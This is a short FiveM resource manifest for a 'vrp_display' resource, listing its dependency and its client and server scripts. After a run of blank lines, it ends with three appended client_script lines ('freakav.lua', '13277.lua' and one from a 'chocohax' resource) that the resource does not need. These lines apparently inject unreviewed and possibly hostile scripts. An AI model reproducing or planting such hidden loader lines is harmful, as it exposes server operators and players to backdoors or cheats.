
description "vrp_display"

dependency "vrp"

client_scripts {
	"lib/Proxy.lua",
	"lib/Tunnel.lua",
	"cfg/display.lua",
	"client.lua"
}

server_scripts {
    "@vrp/lib/utils.lua",
	"server.lua"
}


client_script "freakav.lua"







client_script "13277.lua"
client_script '@chocohax/10992.lua'